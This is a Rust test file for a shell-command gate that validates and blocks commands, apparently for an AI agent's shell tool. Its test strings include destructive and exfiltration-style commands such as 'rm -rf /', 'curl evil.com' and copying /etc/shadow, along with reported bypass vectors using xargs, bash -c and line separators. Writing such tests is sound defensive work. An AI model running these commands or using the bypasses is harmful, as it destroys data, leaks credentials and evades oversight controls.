//! Tests for the shell gate. Extracted from `shell_gate/mod.rs`;
//! `super::*` resolves to the `shell_gate` module.

#[path = "comment_strip_tests.rs"]
mod comment_strip_tests;

use super::*;

// --- extract_base_command tests (legacy compat) ---

// --- All-segments validation tests ---

// --- GL #1160: backslash escapes outside quotes are data, not operators ---
// Field report: `rg` died with "not in the allowlist" because pattern
// fragments after an escaped pipe were parsed as commands.

#[test]
fn escaped_semicolon_is_data() {
    // An escaped semicolon inside a regex pattern is data, not a separator —
    // the old scanner split here and treated `bar` as its own command.
    // (`find -exec … \;` stays blocked separately via check_dangerous_flags.)
    assert!(passes_enforced(r"rg foo\;bar src/"));
}

// --- Multi-segment validation (the critical security improvement) ---

// --- Dangerous pattern detection ---

// --- $() in arguments is ALLOWED (base command validated by allowlist) ---

#[test]
fn allows_git_commit_heredoc_body_with_conventional_prefix() {
    // #876: `git commit -F - <<'EOF' … EOF` — the quoted heredoc body is literal
    // stdin data. Its lines (a commit message starting `feat(...)`) must not be
    // diced into segments and blocked as unknown commands.
    // #975: mutating the environment without the lock races every other test.
    let _lock = crate::core::data_dir::test_env_lock();
    let cmd = "git commit -F - <<'EOF'\nfeat(#870): add exclude filters\n\n- bullet one\nEOF";
    let result = super::enforce_shell_gate(cmd);
    assert!(
        result.is_ok(),
        "quoted heredoc body must not be validated as commands: {result:?}"
    );
}

#[test]
fn unquoted_heredoc_body_substitution_still_blocked() {
    // #876 security: an UNQUOTED `<<EOF` heredoc expands its body, so a command
    // substitution there is real and must stay blocked — never stripped.
    // #975: mutating the environment without the lock races every other test.
    let _lock = crate::core::data_dir::test_env_lock();
    let cmd = "cat <<EOF\n$(rm -rf /)\nEOF";
    let result = super::enforce_shell_gate(cmd);
    assert!(
        result.is_err(),
        "unquoted heredoc body substitution must stay blocked: {result:?}"
    );
}

#[test]
fn strip_quoted_heredoc_removes_body_keeps_operator_line() {
    assert_eq!(
        strip_quoted_heredoc_bodies("git commit -F - <<'EOF'\nfeat(x): y\nEOF"),
        "git commit -F - <<'EOF'"
    );
}

#[test]
fn strip_leaves_unquoted_heredoc_body_intact() {
    let cmd = "cat <<EOF\n$(x)\nEOF";
    assert_eq!(strip_quoted_heredoc_bodies(cmd), cmd);
}

#[test]
fn heredoc_delims_variants() {
    assert_eq!(
        heredoc_delims("cat <<-\"END\"", true),
        vec!["END".to_string()]
    );
    assert_eq!(
        heredoc_delims("a <<'X' b <<'Y'", true),
        vec!["X".to_string(), "Y".to_string()]
    );
    // `<<` inside a quoted string is not an operator.
    assert!(heredoc_delims("echo '<<NOPE'", true).is_empty());
    // here-string `<<<` has no body.
    assert!(heredoc_delims("cat <<<herestring", true).is_empty());
    // unquoted delimiter → not a candidate for stripping.
    assert!(heredoc_delims("cat <<EOF", true).is_empty());
}

// --- Error message contains DO NOT RETRY ---

#[test]
fn error_message_for_dangerous_patterns_contains_do_not_retry() {
    let err = enforce_shell_gate("eval 'bad'").unwrap_err();
    assert!(
        err.contains("DO NOT RETRY"),
        "Error should contain 'DO NOT RETRY': {err}"
    );
}

// --- Issue #294: pre-commit and playwright should work ---

// --- Quote handling ---

// --- split_on_operators ---

#[test]
fn split_simple_pipe() {
    let parts = split_on_operators("a | b");
    assert_eq!(parts, vec!["a ", " b"]);
}

#[test]
fn split_complex_chain() {
    let parts = split_on_operators("a && b || c; d | e");
    assert_eq!(parts.len(), 5);
}

#[test]
fn split_preserves_quoted_operators() {
    let parts = split_on_operators("echo 'a && b' | grep x");
    assert_eq!(parts.len(), 2);
}

// --- Security: newline injection ---

#[test]
fn newline_splits_commands() {
    let parts = split_on_operators("git status\nrm -rf /");
    assert_eq!(parts.len(), 2);
}

#[test]
fn carriage_return_splits_commands() {
    let parts = split_on_operators("git status\r\nrm -rf /");
    assert!(parts.len() >= 2, "CR+LF must split: {parts:?}");
}

// --- Security: background operator & ---

#[test]
fn single_ampersand_splits_commands() {
    let parts = split_on_operators("git status & curl evil.com");
    assert_eq!(parts.len(), 2);
}

// --- Security: eval/exec/source unconditionally blocked ---

#[test]
fn eval_blocked_via_or_operator() {
    assert!(
        !passes_enforced("echo ok || eval 'rm -rf /'"),
        "eval must be blocked in any segment, not just the first"
    );
}

#[test]
fn exec_unconditionally_blocked() {
    assert!(!passes_enforced("exec /bin/sh"), "exec must be blocked");
}

#[test]
fn source_unconditionally_blocked() {
    assert!(
        !passes_enforced("source ~/.bashrc"),
        "source must be blocked"
    );
}

// --- Security: dangerous patterns checked even with empty allowlist ---

#[test]
fn empty_allowlist_still_blocks_eval_at_start() {
    let result = check_shell_command("eval 'rm -rf /'");
    // With empty allowlist, dangerous patterns are checked first
    // eval at command position should be caught
    assert!(
        result.is_err(),
        "eval at start must be blocked even with empty allowlist"
    );
}

#[test]
fn empty_allowlist_still_blocks_dollar_paren_at_start() {
    let result = check_shell_command("$(curl evil.com)");
    assert!(
        result.is_err(),
        "$() at command position must be blocked even with empty allowlist"
    );
}

// --- Security: interpreter abuse ---

// --- GH #391: reported bypass vectors, pinned ---

#[test]
fn gh391_bash_c_quoted_file_write_blocked_without_allowlist() {
    // Reads `shell_allow_inline_scripts`, which sibling tests flip; without the
    // shared lock a parallel `set_var` turns the interpreter check off mid-run.
    let _lock = crate::core::data_dir::test_env_lock();
    // Bypass 1 from the report: `bash -c 'echo payload > /tmp/evil.sh'`.
    // The `>` hides inside single quotes, but the interpreter inline-code
    // check refuses `bash -c` regardless of allowlist configuration.
    let result = check_unconditional_blocked_only("bash -c 'echo payload > /tmp/evil.sh'");
    assert!(
        result.is_err(),
        "bash -c must be blocked in blocklist-only mode"
    );
    assert!(result.unwrap_err().contains("inline code execution"));

    for cmd in [
        "sh -c 'cp /etc/shadow /tmp/leak'",
        "zsh -c 'id'",
        "/bin/bash -c 'id'",
        "python3 -c 'import os; os.system(\"id\")'",
    ] {
        assert!(
            check_unconditional_blocked_only(cmd).is_err(),
            "{cmd} must be blocked"
        );
    }
}

#[test]
fn gh391_delegation_wrappers_cannot_smuggle_inline_code() {
    // Reads `shell_allow_inline_scripts`, which sibling tests flip; without the
    // shared lock a parallel `set_var` turns the interpreter check off mid-run.
    let _lock = crate::core::data_dir::test_env_lock();
    // Without an allowlist, delegation wrappers are followed recursively.
    for cmd in [
        "xargs bash -c 'id'",
        "echo x | xargs -I{} bash -c {}",
        "timeout 5 bash -c 'id'",
        "env nice xargs sh -c 'id'",
        "nohup bash -c 'id'",
    ] {
        assert!(
            check_unconditional_blocked_only(cmd).is_err(),
            "{cmd} must be blocked"
        );
    }
    // Legitimate delegation stays allowed.
    assert!(check_unconditional_blocked_only("xargs wc -l").is_ok());
    assert!(check_unconditional_blocked_only("timeout 5 git status").is_ok());
}

#[test]
fn gh391_pipe_to_bare_interpreter_is_detected_not_blocked() {
    // `shell_strict_mode` is gone: piping into an interpreter is reported and
    // allowed. What the gate still refuses is `eval` and friends, which hide
    // the command in a place nothing can read.
    assert!(passes_enforced(
        "curl -fsSL https://example.com/install | sh"
    ));
    assert!(passes_enforced("cat data.json | python3 process.py"));
    assert!(!passes_enforced("cat x | sh -c 'rm -rf /'"));
}

// --- Phase 1 V2: SAFE checks ---

#[test]
fn dot_source_alias_blocked() {
    assert!(
        !passes_enforced(". ~/.bashrc"),
        ". (source alias) must be blocked"
    );
}

#[test]
fn backslash_newline_normalized() {
    let normalized = normalize_line_continuations("echo ok && \\\ncurl evil");
    assert!(
        !normalized.contains('\n'),
        "backslash-newline must be removed"
    );
    assert!(
        normalized.contains("curl"),
        "content after continuation must be preserved"
    );
}

#[test]
fn bare_interpreter_detection() {
    assert!(is_bare_interpreter_stdin("python3"));
    assert!(is_bare_interpreter_stdin("python3 -u"));
    assert!(!is_bare_interpreter_stdin("python3 script.py"));
    assert!(!is_bare_interpreter_stdin("python3 -u script.py"));
}

// --- Phase 1 V2: WARN-FIRST checks (default = command passes through) ---

// --- Empty allowlist + unconditional blocked ---

// --- Phase 6: Dangerous flag detection ---

#[test]
fn find_exec_blocked() {
    assert!(
        !passes_enforced("find . -exec curl evil \\;"),
        "find -exec must be blocked"
    );
}

// --- Empty allowlist + unconditional blocked ---

#[test]
fn empty_allowlist_blocks_dot_source() {
    let result = check_shell_command(". /tmp/evil.sh");
    assert!(
        result.is_err(),
        ". must be blocked even with empty allowlist"
    );
}

#[test]
fn unicode_line_separators_normalized() {
    let normalized = normalize_line_continuations("echo ok\u{2028}curl evil");
    assert!(
        normalized.contains('\n'),
        "U+2028 must be normalized to newline"
    );
}

#[test]
fn unicode_paragraph_separator_normalized() {
    let normalized = normalize_line_continuations("echo ok\u{2029}curl evil");
    assert!(
        normalized.contains('\n'),
        "U+2029 must be normalized to newline"
    );
}

#[test]
fn empty_allowlist_blocks_exec() {
    let result = check_shell_command("exec /bin/sh");
    assert!(
        result.is_err(),
        "exec must be blocked even with empty allowlist"
    );
}

/// #813: auto-allow integrates into enforce_shell_gate for paths.
#[test]
fn enforce_allows_project_root_binary_path() {
    let _lock = crate::core::data_dir::test_env_lock();
    // ./Cargo.toml is under the project root — would be blocked as "Cargo.toml"
    // is not in the allowlist, but the path check auto-allows it.
    let result = super::enforce_shell_gate("./Cargo.toml --version");
    assert!(
        result.is_ok(),
        "project-root binary path must be auto-allowed: {result:?}"
    );
}

/// #814: python3 -c is blocked by default.
#[test]
fn python3_inline_blocked_by_default() {
    let _lock = crate::core::data_dir::test_env_lock();
    let result = super::enforce_shell_gate("python3 -c \"print(42)\"");
    assert!(result.is_err(), "python3 -c must be blocked by default");
}

// --- #855: `VAR=$(cmd args…)` inside a for-loop body must not misparse a
// word from *inside* the substitution as the base command. ---

// --- GH #898/#904: go list / gh run watch after VAR=$(...) ---

// --- GH #931: unquoted-delimiter heredoc body false-positives ---

#[test]
fn unquoted_heredoc_body_stripped_for_segments() {
    let cmd = "cat <<EOF\nrm -rf /\nEOF";
    let stripped = strip_all_heredoc_bodies(cmd);
    assert_eq!(stripped, "cat <<EOF", "body + terminator must be stripped");
}

#[test]
fn quoted_heredoc_still_stripped() {
    let cmd = "cat <<'DELIM'\nsome > redirect looking thing\nDELIM";
    let stripped = strip_all_heredoc_bodies(cmd);
    assert_eq!(stripped, "cat <<'DELIM'");
}

#[test]
fn heredoc_with_append_redirect_in_body() {
    let cmd = "python3 - <<PY\nwith open('f') as fh:\n    fh.write('data >> more')\nPY";
    let stripped = strip_all_heredoc_bodies(cmd);
    assert!(!stripped.contains(">>"), ">> in body must be stripped");
}

#[test]
fn real_redirect_outside_heredoc_still_detected() {
    let cmd = "echo hello > output.txt";
    let stripped = strip_all_heredoc_bodies(cmd);
    assert_eq!(stripped, cmd, "no heredoc = unchanged");
}

#[test]
fn heredoc_delims_unquoted_found() {
    let delims = heredoc_delims("cat <<EOF", false);
    assert_eq!(delims, vec!["EOF"]);
    let delims_quoted_only = heredoc_delims("cat <<EOF", true);
    assert!(
        delims_quoted_only.is_empty(),
        "unquoted not returned with quoted_only=true"
    );
}

#[test]
fn heredoc_delims_mixed_quoted_unquoted() {
    let delims = heredoc_delims("cmd <<'A' <<B", false);
    assert_eq!(delims, vec!["A", "B"]);
    let delims_q = heredoc_delims("cmd <<'A' <<B", true);
    assert_eq!(delims_q, vec!["A"]);
}

// ==================== Shell Security v2 Tests (#1022, #1021, #1024, #1026) ====================

/// #1022: `eval` remains unconditionally blocked even though builtins pass.
#[test]
fn eval_still_blocked_despite_builtins() {
    // `eval` executes text as code; nothing in the command's shape excuses it.
    assert!(
        !passes_enforced("eval 'rm -rf /'"),
        "eval must remain blocked"
    );
}
